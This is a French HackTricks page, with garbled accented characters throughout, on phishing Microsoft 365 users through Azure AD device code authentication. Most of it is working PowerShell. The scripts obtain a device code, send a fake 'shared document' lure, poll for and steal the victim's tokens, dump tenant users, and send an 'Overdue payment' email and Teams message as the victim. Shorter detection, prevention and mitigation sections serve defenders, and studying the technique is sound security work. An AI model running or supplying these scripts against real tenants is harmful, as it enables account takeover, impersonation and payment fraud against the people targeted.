# Az - Hame√ßonnage avec l'authentification par code d'appareil

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ce post a √©t√© copi√© de** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### Qu'est-ce que l'authentification par code d'appareil <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Selon la [documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) de Microsoft, l'authentification par code d'appareil :

> permet aux utilisateurs de se connecter sur des appareils √† saisie limit√©e tels qu'une smart TV, un appareil IoT ou une imprimante. Pour activer ce flux, l'appareil demande √† l'utilisateur de visiter une page web dans leur navigateur sur un autre appareil pour se connecter. Une fois l'utilisateur connect√©, l'appareil est capable d'obtenir des jetons d'acc√®s et des jetons d'actualisation selon le besoin.

Le processus est le suivant :

1. Un utilisateur lance une application prenant en charge le flux de code d'appareil sur un appareil
2. L'application se connecte au point de terminaison Azure AD /devicecode et envoie **client\_id** et **resource**
3. Azure AD renvoie **device\_code**, **user\_code**, et **verification\_url**
4. L'appareil affiche l'**verification\_url** (hxxps://microsoft.com/devicelogin) et le **user\_code** √† l'utilisateur
5. L'utilisateur ouvre un navigateur et se rend sur **verification\_url**, fournit le **user\_code** lorsqu'on le lui demande et se connecte
6. L'appareil interroge Azure AD jusqu'√† ce qu'apr√®s une connexion r√©ussie, il obtienne **access\_token** et **refresh\_token**

![Flux de code d'appareil](https://o365blog.com/images/posts/phishing\_5.png)

### Hame√ßonnage avec l'authentification par code d'appareil <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

L'id√©e de base pour utiliser l'authentification par code d'appareil pour l'hame√ßonnage est la suivante.

1. Un attaquant se connecte au point de terminaison /devicecode et envoie **client\_id** et **resource**
2. Apr√®s avoir re√ßu **verification\_uri** et **user\_code**, cr√©ez un email contenant un lien vers **verification\_uri** et **user\_code**, et envoyez-le √† la victime.
3. La victime clique sur le lien, fournit le code et termine la connexion.
4. L'attaquant re√ßoit **access\_token** et **refresh\_token** et peut maintenant imiter la victime.

#### 1. Connexion au point de terminaison /devicecode <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

La premi√®re √©tape consiste √† effectuer une requ√™te POST http vers le point de terminaison devicecode d'Azure AD :
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
Je choisis les param√®tres suivants. J'ai choisi d'utiliser le `client_id` de "Microsoft Office" car il semble √™tre le nom d'application le plus l√©gitime, et il peut √©galement √™tre utilis√© pour acc√©der √† d'autres ressources. La ressource choisie donne acc√®s √† l'API Graph AAD qui est utilis√©e par le module PowerShell MSOnline.

| Param√®tre  | Valeur                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

La r√©ponse est similaire √† ce qui suit :
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| Param√®tre         | Description                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | Le code qu'un utilisateur saisira lorsqu'il lui sera demand√©                |
| device\_code      | Le code de l'appareil utilis√© pour "interroger" le r√©sultat de l'authentification |
| verification\_url | L'url que l'utilisateur doit consulter pour l'authentification              |
| expires\_in       | Le temps d'expiration en secondes (15 minutes)                              |
| interval          | L'intervalle en secondes √† quelle fr√©quence le client doit interroger pour l'authentification |
| message           | Le message pr√©format√© √† afficher √† l'utilisateur                            |

Voici un script pour se connecter au point de terminaison devicelogin :
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**Remarque !** J'utilise une version 1.0 qui est un peu diff√©rente du flux v2.0 utilis√© dans la [documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code).

#### 2. Cr√©ation d'un email de phishing <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

Maintenant que nous avons l'**verification\_url** (toujours la m√™me) et le **user\_code**, nous pouvons cr√©er et envoyer un email de phishing.

**Remarque !** Pour envoyer un email, vous avez besoin d'un service smtp fonctionnel.

Voici un script pour envoyer un email de phishing √† la victime :
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
Le courriel re√ßu ressemble √† ceci : ![Flux de code de p√©riph√©rique](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. "Attraper le poisson" - la victime effectue l'authentification <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

Lorsqu'une victime clique sur le lien, le site suivant appara√Æt. Comme nous pouvons le voir, l'URL est une URL Microsoft l√©gitime. L'utilisateur est invit√© √† entrer le code re√ßu par courriel.

![Code de p√©riph√©rique](https://o365blog.com/images/posts/phishing\_7.png)

Apr√®s avoir entr√© le code, l'utilisateur est invit√© √† s√©lectionner l'utilisateur pour se connecter. Comme nous pouvons le voir, il est demand√© √† l'utilisateur de se connecter √† **Microsoft Office** - aucun consentement n'est demand√©.

**Note !** Si l'utilisateur n'est pas connect√©, il doit se connecter en utilisant les m√©thodes que l'organisation cible utilise.

![Connexion](https://o365blog.com/images/posts/phishing\_8.png)

Apr√®s une authentification r√©ussie, ce qui suit est montr√© √† l'utilisateur.

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **√Ä ce stade, l'identit√© de l'utilisateur est compromise !** :warning:

#### 4. R√©cup√©ration des jetons d'acc√®s <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

La derni√®re √©tape pour l'attaquant est de r√©cup√©rer les jetons d'acc√®s. Apr√®s avoir compl√©t√© l'√©tape 2, l'attaquant commence √† interroger Azure AD pour le statut de l'authentification.

L'attaquant doit effectuer une requ√™te http POST vers le point de terminaison de jeton Azure AD toutes les 5 secondes :
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
La requ√™te doit inclure les param√®tres suivants (code est le device\_code de l'√©tape 1)

| Param√®tre   | Valeur                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

Si l'authentification est en attente, une erreur http **400 Bad Request** est retourn√©e avec le contenu suivant :
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
Apr√®s une connexion r√©ussie, nous obtiendrons la r√©ponse suivante (jetons tronqu√©s) :
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
Le script suivant se connecte au point de terminaison de jeton Azure AD et interroge le statut de l'authentification.
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
Maintenant, nous pouvons utiliser le jeton d'acc√®s pour se faire passer pour la victime :
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
Nous pouvons √©galement obtenir des jetons d'acc√®s pour d'autres services en utilisant le jeton de rafra√Æchissement tant que le client\_id reste le m√™me.

Le script suivant obtient un jeton d'acc√®s pour Exchange Online.
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## Utilisation de AADInternals pour le phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 ou ult√©rieur) dispose d'une fonction [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) qui automatise le processus de phishing.

Le message de phishing peut √™tre personnalis√©, le message par d√©faut est le suivant :
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
Message par d√©faut dans l'email :\
![Email de phishing](https://o365blog.com/images/posts/phishing\_11.png)

Message par d√©faut dans Teams :\
![Message de phishing](https://o365blog.com/images/posts/phishing\_12.png)

### Email <a href="#email" id="email"></a>

L'exemple suivant envoie un email de phishing en utilisant un message personnalis√©. Les jetons sont sauvegard√©s dans le cache.
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
Et maintenant, nous pouvons envoyer des e-mails en tant que victime en utilisant le jeton mis en cache.
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
Nous pouvons √©galement envoyer un message Teams pour rendre la demande de paiement plus urgente :
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**La vid√©o suivante montre comment utiliser AADInternals pour le phishing par e-mail.**

### Teams <a href="#teams" id="teams"></a>

AADInternals permet d'envoyer des messages de phishing sous forme de messages de chat Teams.

**Notez !** Apr√®s que la victime se soit ¬´ authentifi√©e ¬ª et que les jetons aient √©t√© re√ßus, AADInternals remplacera le message original. Ce message peut √™tre fourni avec le param√®tre -CleanMessage.

Le message de nettoyage par d√©faut est :
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
```markdown
![Message propre dans Teams](https://o365blog.com/images/posts/phishing_13.png)

L'exemple suivant envoie un e-mail de phishing en utilisant des messages personnalis√©s. Les jetons sont enregistr√©s dans le cache.
```
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**La vid√©o suivante montre comment utiliser AADInternals pour le phishing sur Teams.**

## D√©tection <a href="#detecting" id="detecting"></a>

Tout d'abord, du point de vue d'Azure AD, la connexion a lieu l√† o√π l'authentification a √©t√© **initi√©e**. C'est un point tr√®s important √† comprendre. Cela signifie que dans le journal de connexion, la connexion a √©t√© effectu√©e depuis l'**emplacement et l'appareil de l'attaquant**, et non de l'utilisateur.

Cependant, les jetons d'acc√®s obtenus en utilisant le jeton d'actualisation **n'apparaissent pas dans le journal de connexion !**

Ci-dessous un exemple o√π j'ai initi√© le phishing depuis une VM Azure (en fait, depuis le [cloud shell](https://o365blog.com/post/cloudshell/) pour √™tre plus pr√©cis). Comme nous pouvons le voir, la connexion en utilisant le client "Microsoft Office" a eu lieu √† 7h23 depuis l'adresse IP 51.144.240.233. Cependant, l'obtention du jeton d'acc√®s pour Exchange Online √† 7h27 n'est pas affich√©e dans le journal.

![Journal de connexion Azure AD](https://o365blog.com/images/posts/phishing\_10.png)

:warning: S'il y a des indications que l'utilisateur se connecte depuis des emplacements atypiques, le compte utilisateur pourrait √™tre compromis.

## Pr√©vention <a href="#preventing" id="preventing"></a>

La seule mani√®re efficace de pr√©venir le phishing utilisant cette technique est d'utiliser des politiques de [Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) (CA). Pour √™tre pr√©cis, **le phishing ne peut pas √™tre pr√©venu**, mais nous pouvons **emp√™cher les utilisateurs de se connecter** en fonction de certaines r√®gles. Les politiques bas√©es sur l'emplacement et l'√©tat de l'appareil sont particuli√®rement efficaces pour prot√©ger les comptes. Cela s'applique √† toutes les techniques de phishing actuellement utilis√©es.

Cependant, il n'est pas possible de couvrir tous les sc√©narios. Par exemple, forcer l'authentification multifacteur (MFA) pour les connexions depuis des emplacements illicites n'aide pas si l'utilisateur se connecte en utilisant la MFA.

## Att√©nuation <a href="#mitigating" id="mitigating"></a>

Si l'utilisateur a √©t√© compromis, les jetons d'actualisation de l'utilisateur peuvent √™tre [r√©voqu√©s](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0), ce qui emp√™che l'attaquant d'obtenir de nouveaux jetons d'acc√®s avec le jeton d'actualisation compromis.

## R√©sum√© <a href="#summary" id="summary"></a>

√Ä ma connaissance, la technique de flux d'authentification par code d'appareil n'a pas √©t√© utilis√©e pour le phishing auparavant.

Du point de vue de l'attaquant, cette m√©thode pr√©sente plusieurs avantages :

* Pas besoin d'enregistrer des applications
* Pas besoin de mettre en place une infrastructure de phishing pour de fausses pages de connexion, etc.
* Il est seulement demand√© √† l'utilisateur de se connecter (g√©n√©ralement √† "Microsoft Office") - aucun consentement demand√©
* Tout se passe dans l'espace de noms **login.microsoftonline.com**
* L'attaquant peut utiliser n'importe quel client\_id et ressource (bien que toutes les combinaisons ne fonctionnent pas)
* Si l'utilisateur s'est connect√© en utilisant la MFA, le jeton d'acc√®s a √©galement une revendication MFA (cela inclut aussi les jetons d'acc√®s obtenus en utilisant le jeton d'actualisation)
* La pr√©vention n√©cessite Conditional Access (et des licences Azure AD Premium P1/P2)

Du point de vue de l'attaquant, cette m√©thode pr√©sente au moins un inconv√©nient :

* Le code utilisateur n'est valide que pendant 15 minutes

Bien s√ªr, l'attaquant peut minimiser la restriction de temps en envoyant l'email de phishing √† plusieurs destinataires - cela augmentera la probabilit√© que quelqu'un se connecte en utilisant le code.

Une autre mani√®re est d'impl√©menter [un proxy](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333) qui d√©marrerait l'authentification lorsque le lien est cliqu√© (cr√©dits √† [@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)). Cependant, de cette fa√ßon, l'avantage d'utiliser une URL microsoft.com l√©gitime serait perdu.

Liste de contr√¥le pour survivre aux campagnes de phishing :

1. **√âduquez vos utilisateurs** sur la s√©curit√© de l'information et le phishing :woman\_teacher:
2. Utilisez l'authentification multifacteur (MFA) :iphone:
3. Utilisez Intune :hammer\_and\_wrench: et Conditional Access (CA) :stop\_sign:

\

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
